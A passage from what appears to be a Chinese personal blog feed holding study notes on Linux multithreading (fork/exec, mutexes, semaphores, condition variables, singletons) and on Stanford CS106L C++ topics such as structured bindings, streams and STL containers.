的性能：</p><ul><li><strong>写时复制的含义</strong>：<code>fork</code>之后，父进程和子进程共享同一块物理内存，直到其中一个进程尝试修改内存时，操作系统才会为修改的进程复制一份新的内存页。</li><li>这种机制避免了不必要的内存复制，提高了性能。</li></ul></li><li><p><code>exec</code> 的作用</p><p><code>exec</code> 的作用是<strong>替换当前进程的映像</strong>。具体来说：</p><ul><li><code>exec</code>会将当前进程的代码段、数据段、堆栈等全部替换为新程序的内容。</li><li>调用 <code>exec</code>后，当前进程的内存空间会被新程序的内容覆盖。</li></ul></li><li><p>结合 <code>fork</code> 和 <code>exec</code> 的工作流程</p><p>当你在子进程中调用 <code>exec</code> 时，会发生以下事情：</p><ol type="1"><li><strong>子进程的内存被替换</strong>：</li></ol><ul><li><code>exec</code>会加载新程序的代码和数据到子进程的内存空间中。</li><li>由于写时复制的机制，子进程的内存修改不会影响父进程。</li></ul><ol start="2" type="1"><li><strong>父进程不受影响</strong>：</li></ol><ul><li>父进程的内存空间保持不变，继续执行原来的代码。</li></ul><ol start="3" type="1"><li><strong>子进程执行新程序</strong>：</li></ol><ul><li>子进程从新程序的入口点（通常是 <code>main</code>函数）开始执行。</li></ul></li></ol><h2 id="多线程编程">多线程编程</h2><h3 id="互斥锁">1. 互斥锁</h3><p>互斥锁（<code>pthread_mutex_t</code>）是一种用于<strong>保护共享资源</strong>的同步机制，它确保同一时刻只有一个线程可以访问共享资源。多个线程如果要访问同一资源，必须先获取该互斥锁，获取锁成功后才能访问资源，访问完毕后释放锁。</p><ul><li><strong>主要作用</strong>：保护共享资源，防止多个线程同时访问导致数据不一致。</li><li><strong>行为</strong>：加锁后，其他线程无法加锁，直到锁被释放。</li><li><strong>示例用法</strong>：保证线程安全地访问全局变量、共享数据结构等。</li></ul><h3 id="信号量">2. 信号量</h3><p>信号量（<code>sem_t</code>）是一种计数机制，用于控制多个线程对共享资源的访问。信号量通常用于控制并发的线程数，或者用于线程间的同步。当信号量的值大于0 时，表示可以继续执行，线程会执行<code>sem_wait</code>（等待）直到信号量大于 0，然后<code>sem_post</code>（释放）信号量。</p><ul><li><strong>主要作用</strong>：控制对共享资源的访问数量或线程间的同步。</li><li><strong>行为</strong>：信号量的值可以增加或减少，通常用于实现生产者-消费者模式、控制线程池大小等。</li><li><strong>示例用法</strong>：控制线程池中同时运行的线程数，或者协调生产者和消费者之间的同步。</li></ul><h3 id="条件变量">3. 条件变量</h3><p>条件变量（<code>pthread_cond_t</code>）是用于<strong>线程间协调</strong>的同步机制，允许线程在某个条件满足时被唤醒。它通常与互斥锁配合使用。当一个线程需要等待某个条件满足时，它会在条件变量上等待，并释放互斥锁。一旦条件满足，另一个线程就会通过条件变量通知（<code>signal</code>或 <code>broadcast</code>）其他线程继续执行。</p><ul><li><strong>主要作用</strong>：线程间的协调与同步，常用于“等待某个条件满足”后继续执行。</li><li><strong>行为</strong>：线程等待条件变量时会释放互斥锁，直到条件满足时被通知。</li><li><strong>示例用法</strong>：线程等待某个资源准备好，或者等待某个状态变更，例如生产者-消费者模式中的条件等待。</li></ul><blockquote><p><code>pthread_cond_wait(&amp;cond, &amp;mutex)</code>：</p><ul><li>该函数会使当前线程进入<strong>阻塞状态</strong>，并且<strong>自动释放</strong>传入的<code>mutex</code>，直到满足条件并且 <code>pthread_cond_signal()</code>或 <code>pthread_cond_broadcast()</code>被调用时，才会唤醒该线程并重新获取锁。</li></ul><p><code>pthread_cond_signal()</code>：</p><ul><li>该函数 <strong>不会</strong> 释放 <code>mutex</code>。它的作用是通知<strong>至少一个</strong> 等待该条件变量的线程可以继续执行。</li></ul></blockquote><h2 id="线程池">线程池</h2><h3 id="pthread_create"><code>pthread_create()</code></h3><p>父线程调用 <code>pthread_create()</code>来创建子线程。在这个过程中，父线程提供一个回调函数（通常称为线程函数），该回调函数定义了子线程的行为。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">pthread_create</span><span class="params">(<span class="type">pthread_t</span> *thread, <span class="type">const</span> <span class="type">pthread_attr_t</span> *attr, <span class="type">void</span> *(*start_routine)(<span class="type">void</span> *), <span class="type">void</span> *arg)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>参数：</p><ul><li><code>thread</code>:线程标识符的指针，函数成功后会填充该值，表示新创建的子线程。</li><li><code>attr</code>: 用于线程属性的结构体，通常可以为<code>NULL</code>，表示使用默认属性。</li><li><code>start_routine</code>: 子线程执行的函数（线程函数）。</li><li><code>arg</code>: 传递给子线程函数的参数。</li></ul><h3 id="pthread_detach"><code>pthread_detach</code></h3><p><code>pthread_detach</code> 是 POSIX线程库（<code>pthread</code>）中的一个函数，用于<strong>分离线程</strong>，使其在结束时自动释放资源，而不需要<code>pthread_join()</code> 进行回收。</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">pthread_detach</span><span class="params">(<span class="type">pthread_t</span> thread)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>参数：</p><ul><li><code>thread</code>：要分离的线程 ID（<code>pthread_t</code>类型）。</li></ul><p>返回值</p><ul><li><strong>成功</strong>：返回 <code>0</code>。</li><li>失败：返回错误码（例如 EINVAL或 ESRCH）。<ul><li><code>EINVAL</code>（InvalidArgument）：线程已经是<strong>分离状态</strong>。</li><li><code>ESRCH</code>（No Such Process）：线程 ID无效，线程不存在。</li></ul></li></ul><blockquote><table><colgroup><col style="width: 16%"><col style="width: 37%"><col style="width: 12%"><col style="width: 14%"><col style="width: 18%"></colgroup><thead><tr class="header"><th><strong>函数</strong></th><th><strong>作用</strong></th><th><strong>回收资源</strong></th><th><strong>主线程等待</strong></th><th><strong>适用场景</strong></th></tr></thead><tbody><tr class="odd"><td><code>pthread_detach</code></td><td>让线程<strong>自动释放</strong>，无需 <code>join</code></td><td>✅ 是</td><td>❌ 否</td><td>长期运行的工作线程</td></tr><tr class="even"><td><code>pthread_join</code></td><td><strong>阻塞</strong>等待线程执行完，并获取返回值</td><td>✅ 是</td><td>✅ 是</td><td>需要获取线程结果</td></tr></tbody></table></blockquote><h2 id="单例模式">单例模式</h2><blockquote><ol type="1"><li><p><strong>构造函数必须私有化</strong>（否则不是单例）</p></li><li><p>析构函数根据需求选择：</p><ul><li>需要防止外部删除 → 私有化 + 自定义销毁逻辑（如 atexit）<ul><li>禁止用户直接销毁对象，通常用于单例模式或对象池。</li><li>控制对象的生命周期，只能通过特定的成员函数销毁对象。</li></ul></li><li>使用 Meyer's Singleton（局部静态变量）→ 可公开析构</li></ul></li></ol></blockquote><h3 id="懒汉模式">懒汉模式</h3><p>实例在第一次使用时创建</p><ul><li>在 C++11及以上版本中，局部静态变量的初始化是线程安全的，可以简化单例模式的实现</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">single</span> {</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">single</span>() {}</span><br><span class="line">    ~<span class="built_in">single</span>() {}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> single&amp; <span class="title">getinstance</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="type">static</span> single instance;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h3 id="饿汉模式">饿汉模式</h3><p>实例在程序启动时创建</p><ul><li>利用局部静态变量的特性实现线程安全的单例模式。</li><li>C++11 及以上版本保证局部静态变量的初始化是线程安全的</li></ul><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> {</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">static</span> Singleton* <span class="title">getInstance</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">Singleton</span>() {}  <span class="comment">// 私有构造函数</span></span><br><span class="line">    <span class="built_in">Singleton</span>(<span class="type">const</span> Singleton&amp;) = <span class="keyword">delete</span>;  <span class="comment">// 禁止拷贝构造</span></span><br><span class="line">    Singleton&amp; <span class="keyword">operator</span>=(<span class="type">const</span> Singleton&amp;) = <span class="keyword">delete</span>;  <span class="comment">// 禁止赋值操作</span></span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> Singleton* instance;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line">Singleton* Singleton::instance = <span class="keyword">new</span> <span class="built_in">Singleton</span>();  <span class="comment">// 静态成员初始化</span></span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>CPP</category>
      
      <category>网络编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CPP</tag>
      
      <tag>Linux</tag>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CS106L-24Autumn</title>
    <link href="/2025/02/04/CS106L/"/>
    <url>/2025/02/04/CS106L/</url>
    
    <content type="html"><![CDATA[<p>课程官网：http://web.stanford.edu/class/cs106l/</p><p>Assignment代码：https://github.com/cs106l/cs106l-assignments/tree/main</p><h2 id="stdpair">std::pair</h2><p>是一种类模板，它将<strong>两个</strong>异质对象作为一个单元存储，由头文件<code>#include &lt;utility&gt;</code>定义</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原理</span></span><br><span class="line"><span class="keyword">template</span>&lt;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">T1</span>,</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">T2</span></span><br><span class="line">&gt; <span class="keyword">struct</span> <span class="title class_">pair</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例</span></span><br><span class="line">std::pair&lt;std::string, <span class="type">int</span>&gt; dozen {<span class="string">"eggs"</span>, <span class="number">12</span>};</span><br></pre></td></tr></tbody></table></figure><h2 id="using">using</h2><p><code>using</code>关键字可以定义别名，例如：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Zeros 是 std::pair&lt;double, double&gt; 的简化名称</span></span><br><span class="line"><span class="keyword">using</span> Zeros = std::pair&lt;<span class="type">double</span>, <span class="type">double</span>&gt;; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Solution 是 std::pair&lt;bool, Zeros&gt; 的简化名称</span></span><br><span class="line"><span class="keyword">using</span> Solution = std::pair&lt;<span class="type">bool</span>, Zeros&gt;;</span><br></pre></td></tr></tbody></table></figure><h2 id="auto">auto</h2><p><code>auto</code>关键字让编译器推断变量的类型，例如：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 未简化</span></span><br><span class="line">std::pair&lt;<span class="type">bool</span>, std::pair&lt;<span class="type">double</span>, <span class="type">double</span>&gt;&gt; result = <span class="built_in">solveQuadratic</span>(a, b, c);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用auto关键字</span></span><br><span class="line"><span class="keyword">auto</span> result = <span class="built_in">solveQuadratic</span>(a, b, c);</span><br></pre></td></tr></tbody></table></figure><h2 id="统一初始化c11">统一初始化（C++11）</h2><p>使用<code>=</code>或者<code>()</code>进行初始化会默认进行类型转换，例如：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> numOne = <span class="number">12.0</span>; <span class="comment">// numOne是12</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">numTwo</span><span class="params">(<span class="number">12.0</span>)</span></span>; <span class="comment">// numTwo也是12</span></span><br></pre></td></tr></tbody></table></figure><p><strong>统一初始化</strong>（<strong>UniformInitialization</strong>）是 C++11 引入的一种新的初始化语法，旨在提供一种<strong>统一且更安全</strong> 的方式来初始化变量和对象。它通过<strong>大括号 <code>{}</code></strong> 实现初始化。例如：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> numOne{<span class="number">12.0</span>}; <span class="comment">// 编译时报错，不允许类型缩小转换（double-&gt;int）</span></span><br><span class="line"><span class="type">float</span> numTwo{<span class="number">12.0</span>}; <span class="comment">// 正确</span></span><br></pre></td></tr></tbody></table></figure><p>除了基本类型，统一初始化还可用于<code>vector</code>、<code>map</code>等不同容器</p><h2 id="结构化绑定c17">结构化绑定（C++17）</h2><p>结构化绑定是C++17引入的一种新特性，用于将<strong>元组（<code>std::tuple</code>）</strong>、<strong>结构体</strong>或类似的可解构对象分解为多个独立变量。它提供了一种简便的方法来直接解构数据。</p><p>示例：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">std::tuple&lt;std::string, std::string, std::string&gt; <span class="title">getClassInfo</span><span class="params">()</span> </span>{</span><br><span class="line">    std::string className = <span class="string">"CS106L"</span>;</span><br><span class="line">    std::string buildingName = <span class="string">"Thornton 110"</span>;</span><br><span class="line">    std::string language = <span class="string">"C++"</span>;</span><br><span class="line">    <span class="keyword">return</span> {className, buildingName, language}; <span class="comment">// 这里返回的是tuple对象</span></span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="keyword">auto</span> [className, buildingName, language] = <span class="built_in">getClassInfo</span>(); <span class="comment">// 注意这一行</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Come to "</span> &lt;&lt; buildingName &lt;&lt; <span class="string">" and join us for "</span> &lt;&lt; className</span><br><span class="line">              &lt;&lt; <span class="string">" to learn "</span> &lt;&lt; language &lt;&lt; <span class="string">"!"</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我疑惑的点在于，明明<code>getClassInfo()</code>返回值是tuple对象，为什么最后变成了三个对象？因为第八行的<code>[ ]</code>是结构化绑定的标准语法，用于<strong>解构</strong><code>getClassInfo</code> 返回的<code>std::tuple</code>，<strong>将元组中的每个元素绑定到独立变量中</strong>。</p><h3 id="引用与结构化绑定">引用与结构化绑定</h3><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">shift</span><span class="params">(std::vector&lt;std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; &amp;nums)</span> </span>{</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> [num1, num2] : nums) { <span class="comment">// 值绑定：产生副本，修改不影响原始数据</span></span><br><span class="line">        num1++;</span><br><span class="line">        num2++;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>调用该函数是无法该改变<code>nums</code>的，应该在<code>auto</code>后面添加<code>&amp;</code>符号</p><h2 id="左值和右值">左值和右值</h2><h3 id="左值-l-value">左值 l-value</h3><p>左值可以放置在<code>=</code>符号的左边或者右边</p><p>例如：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// x 是左值，下面两个式子均成立</span></span><br><span class="line"><span class="type">int</span> y = x;</span><br><span class="line">x = <span class="number">344</span>;</span><br></pre></td></tr></tbody></table></figure><h3 id="右值-r-value">右值 r-value</h3><p>右值只能放置在<code>=</code>符号的右边</p><p>例如：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 21 是右值</span></span><br><span class="line"><span class="type">int</span> y = <span class="number">21</span>; <span class="comment">// 正确</span></span><br><span class="line"></span><br><span class="line"><span class="number">21</span> = y; <span class="comment">// 错误</span></span><br></pre></td></tr></tbody></table></figure><p><strong>注意</strong>：当函数的参数声明为引用时，则不能在调用时使用右值作为参数</p><h2 id="stream">stream</h2><h3 id="stdcout">std::cout</h3><p>输出流在中的字符在被刷新到目标（终端）之前存储在中间缓冲区中</p><h3 id="stdstringstream">std::stringstream</h3><p>字符串流，用于处理（例如：分割）字符串。 示例：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    <span class="comment">// partial Bjarne Quote</span></span><br><span class="line">    std::string initial_quote = “Bjarne Stroustrup C makes it easy to shoot yourself in the foot\n<span class="string">"</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // create a stringstream</span></span><br><span class="line"><span class="string">    std::stringstream ss(initial_quote); // 初始化字符串流，可以用下面两行代替</span></span><br><span class="line"><span class="string">    /*</span></span><br><span class="line"><span class="string">    std::stringstream ss;</span></span><br><span class="line"><span class="string">ss &lt;&lt; initial_quote;</span></span><br><span class="line"><span class="string">    */</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // data destinations</span></span><br><span class="line"><span class="string">    std::string first;</span></span><br><span class="line"><span class="string">    std::string last;</span></span><br><span class="line"><span class="string">    std::string language, extracted_quote;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // &gt;&gt;运算符只读取到下一个whitespace(空格，\n，\t)</span></span><br><span class="line"><span class="string">    ss &gt;&gt; first &gt;&gt; last &gt;&gt; language;</span></span><br><span class="line"><span class="string">    // 要让extracted_quote等于"</span>makes it easy to shoot yourself in the foot<span class="string">"需要使用getline()</span></span><br><span class="line"><span class="string">    std::getline(ss, extracted_quote);</span></span><br><span class="line"><span class="string">    std::cout &lt;&lt; first &lt;&lt; “ ” &lt;&lt; last &lt;&lt; “ said this: ”&lt;&lt; language &lt;&lt; “ “ &lt;&lt; </span></span><br><span class="line"><span class="string">    extracted_quote &lt;&lt; std::endl;</span></span><br><span class="line"><span class="string">}</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></tbody></table></figure><blockquote><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">istream&amp; <span class="title">getline</span><span class="params">(istream&amp; is, string&amp; str, <span class="type">char</span> delim)</span></span></span><br></pre></td></tr></tbody></table></figure><p>读取输入流<code>is</code>，直到<code>delim</code>字符（默认是<code>\n</code>），并将其存储在某个缓冲区（变量）<code>str</code>中</p></blockquote><h3 id="stdflush">std::flush</h3><p>用于刷新<code>stream</code>流，将缓冲区中的数据<strong>立即</strong>发送到控制台（终端）</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Long operation in progress: "</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; ++i) {</span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">seconds</span>(<span class="number">1</span>));</span><br><span class="line">        std::cout &lt;&lt; i + <span class="number">1</span> &lt;&lt; <span class="string">", "</span> &lt;&lt; std::flush;</span><br><span class="line">    }</span><br><span class="line">    std::cout &lt;&lt; <span class="string">"Operation completed!"</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">// 每隔一秒输出一个数字</span></span><br></pre></td></tr></tbody></table></figure><p>若上述代码不加<code>std::flush</code>，那么输出会在五秒后全部<strong>一次性显示</strong>。</p><p><code>std::cout</code>通常是行缓冲的，所以<code>std::endl</code>也会使得<code>stream</code>进行刷新，每次循环都会输出一个数字，但是这种行为使得运行效率低下，所以可以将<code>std::endl</code>换成<code>\n</code>，这样当缓冲区满或者循环结束时才会一次性输出（注意要提前声明<code>std::ios::sync_with_stdio(false);</code>）。</p><h3 id="stdofstream">std::ofstream</h3><p>Output File Stream，将数据写入文件。</p><p>示例：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>{</span><br><span class="line"><span class="comment">/// associating file on construction</span></span><br><span class="line"><span class="function">std::ofstream <span class="title">ofs</span><span class="params">(“hello.txt”)</span></span>; <span class="comment">// 等价于下面两行</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    std::ofstream ofs; </span></span><br><span class="line"><span class="comment">    ofs.open(“hello.txt”);</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (ofs.<span class="built_in">is_open</span>()) {  <span class="comment">// 检查文件是否已打开，如果已打开，则尝试向其写入字符串 </span></span><br><span class="line">ofs &lt;&lt; “Hello CS106L!” &lt;&lt; ‘\n’; </span><br><span class="line">}</span><br><span class="line">ofs.<span class="built_in">close</span>();</span><br><span class="line">ofs &lt;&lt; “<span class="keyword">this</span> will <span class="keyword">not</span> get written”; <span class="comment">// 由于文件流已关闭，会导致写入失败</span></span><br><span class="line">    </span><br><span class="line">ofs.<span class="built_in">open</span>(“hello.txt”);</span><br><span class="line">ofs &lt;&lt; “<span class="keyword">this</span> will though! It’s open again”;  <span class="comment">// 写入成功</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="stdcin">std::cin</h3><p><code>std::cin</code>也会先把字符存入缓冲区，然后从缓冲区中读取内容。</p><p>示例：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::cin &gt;&gt; a;  <span class="comment">// 输入字符，存入缓冲区，然后从缓冲区读取字符到变量a</span></span><br></pre></td></tr></tbody></table></figure><p><code>std::cin</code>遇到whitespace则会停止存入缓冲区</p><p>Whitespace in C++ includes:</p><ul><li>“ ” – a literal space（空格）</li><li><code>\n</code> character</li><li><code>\t</code> character</li></ul><h2 id="stl">STL</h2><p>Standard Template Library</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20250105162916455.png" alt="image-20250105162916455"><figcaption aria-hidden="true">image-20250105162916455</figcaption></figure><h3 id="sequence-containers">Sequence Containers</h3><p>存放线性序列</p><h4 id="stdvector">std::vector</h4><p>使用 range-based for (适用于所有可迭代容器)遍历 vector</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> elem : vec) {  <span class="comment">// for (const auto&amp; elem : v) 可以节省副本的开销</span></span><br><span class="line">std::cout &lt;&lt; elem &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ul><li><code>push_back()</code>： 会导致容器大小 <code>size()</code>增加，同时如果没有足够空间，容量 <code>capacity()</code> 也随着增加</li><li><code>pop_back()</code>：移除容器中最后一个元素，并将容器的<code>size()</code>减小，<strong>容量</strong>(<code>capacity()</code>) 保持不变。</li></ul><h4 id="stddeque">std::deque</h4><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20250107220918767.png" alt="image-20250107220918767"><figcaption aria-hidden="true">image-20250107220918767</figcaption></figure><p><code>std::deque</code> 的底层实现结合了 <strong>分段内存</strong> 和<strong>指针数组</strong> 的设计：</p><ol type="1"><li><strong>分段存储</strong>：<ul><li>与 <code>std::vector</code> 不同，<code>std::deque</code>不使用一块连续的大内存块，而是将数据分为多个固定大小的内存块（称为缓冲区或block）。</li><li>每个缓冲区的大小通常是固定的（具体大小依赖于实现，通常为 512字节或更多）。</li></ul></li><li><strong>指针数组（Map Array）</strong>：<ul><li><code>std::deque</code> 使用一个指针数组（称为 map或控制块）来管理这些缓冲区。</li><li>这个指针数组存储了每个缓冲区的起始地址，并负责定位实际数据的位置。</li></ul></li></ol><h4 id="stdlist">std::list</h4><p><code>std::list</code> 是 C++ 标准库中的双向链表（Doubly LinkedList）容器，定义在 <code>&lt;list&gt;</code> 头文件中。与<code>std::vector</code> 不同，<code>std::list</code>允许高效地在序列的任意位置进行插入和删除操作，但不支持随机访问。</p><ul><li><strong>双向链表结构</strong>：每个元素都有前驱和后继指针。</li><li><strong>动态大小</strong>：不需要预分配内存，适用于频繁的插入/删除操作。</li><li><strong>高效的插入/删除</strong>：<code>O(1)</code>复杂度，不涉及大规模元素移动。</li><li><strong>不支持随机访问</strong>：不能通过 <code>operator[]</code>访问元素，必须使用迭代器。</li></ul><h3 id="associative-containers">Associative Containers</h3><p>通过 key 来组织元素</p><h4 id="stdmap">std::map</h4><ul><li><p>等价于python中的字典</p></li><li><p>示例：</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">std::map&lt;std::string, <span class="type">int</span>&gt; map {</span><br><span class="line">  { <span class="string">"Chris"</span>, <span class="number">2</span> },</span><br><span class="line">  { <span class="string">"CS106L"</span>, <span class="number">42</span> },</span><br><span class="line">  { <span class="string">"Keith"</span>, <span class="number">14</span> },</span><br><span class="line">  { <span class="string">"Nick"</span>, <span class="number">51</span> },</span><br><span class="line">  { <span class="string">"Sean"</span>, <span class="number">35</span> },</span><br><span class="line">};</span><br><span class="line"><span class="type">int</span> sean = map[<span class="string">"Sean"</span>]; <span class="comment">// 35</span></span><br><span class="line">map[<span class="string">"Chris"</span>] = <span class="number">31</span>;</span><br></pre></td></tr></tbody></table></figure></li><li><p><code>std::map</code> 中，每个元素是一个 <code>std::pair</code>对象，其中包含 <code>first</code> 和 <code>second</code>两个成员。<code>first</code> 是键（key），<code>second</code>是值（value）</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 